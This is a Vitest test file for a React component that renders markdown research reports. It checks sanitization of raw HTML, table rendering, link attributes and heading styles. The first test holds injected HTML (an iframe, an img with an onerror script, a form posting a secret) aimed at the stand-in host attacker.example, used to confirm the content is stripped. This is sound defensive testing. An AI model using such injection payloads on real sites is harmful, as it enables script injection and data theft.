import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it, vi } from 'vitest';

import ResearchReport from './ResearchReport';


const renderReport = (report: string): string => renderToStaticMarkup(
  <ResearchReport
    output={{ summary: '', details: { report } }}
    isResetting={false}
    isStreaming={false}
    glassStyle={{ base: '', card: '', input: '' }}
    fadeInAnimation={{ fadeIn: '', writing: '' }}
    loaderColor="#468BFF"
    isGeneratingPdf={false}
    isCopied={false}
    onCopyToClipboard={vi.fn()}
    onGeneratePdf={vi.fn()}
  />,
);


describe('ResearchReport', () => {
  it('不渲染报告中的原始主动 HTML', () => {
    const html = renderReport(`
# 安全报告

<iframe src="https://attacker.example/frame"></iframe>
<img src="https://attacker.example/pixel" onerror="alert(1)">
<form action="https://attacker.example/collect"><input name="secret"></form>
`);

    expect(html).not.toContain('<iframe');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('<form');
    expect(html).not.toContain('<input');
    expect(html).not.toContain('attacker.example');
  });

  it('继续渲染 GFM 表格', () => {
    const html = renderReport('| 字段 | 内容 |\n| --- | --- |\n| 状态 | 正常 |');

    expect(html).toContain('<table>');
    expect(html).toContain('<td>正常</td>');
  });

  it.each([
    ['英文冒号标签和裸链接', '• 官网: https://example.com/company', 'https://example.com/company'],
    ['中文冒号标签和裸链接', '• 官网：https://example.com/company', 'https://example.com/company'],
    ['Markdown 链接', '• 官网: [公司官网](https://example.com/company)', '公司官网'],
    ['加粗与链接混排', '• 官网: **公司信息**见[公司官网](https://example.com/company)', '公司官网'],
    ['普通段落中的裸链接', '详情见 https://example.com/company', 'https://example.com/company'],
  ])('保留%s的链接目标及正文', (_name, markdown, label) => {
    const html = renderReport(markdown);

    expect(html).toContain('href="https://example.com/company"');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer"');
    expect(html).toContain(`>${label}</a>`);
    expect(html).not.toContain('[object Object]');
    if (markdown.includes('**公司信息**')) {
      expect(html).toContain('<strong>公司信息</strong>');
    }
  });

  it('不截断链接内的端口和正文内的冒号', () => {
    const html = renderReport('• 官网: http://example.com:8080/company\n\n• 开放时间: 上午10:30');

    expect(html).toContain('href="http://example.com:8080/company"');
    expect(html).toContain('上午10:30');
    expect(html).not.toContain('[object Object]');
  });

  it('保留纯文本标题样式，但不把混排节点当作字符串标题', () => {
    const html = renderReport('核心业务：\n\n**公司信息：**\n\n# **公司**调研报告');

    expect(html).toContain('>核心业务</h3>');
    expect(html).toContain('<strong>公司信息：</strong>');
    expect(html).toContain('<strong>公司</strong>调研报告</h1>');
    expect(html).not.toContain('[object Object]');
  });
});
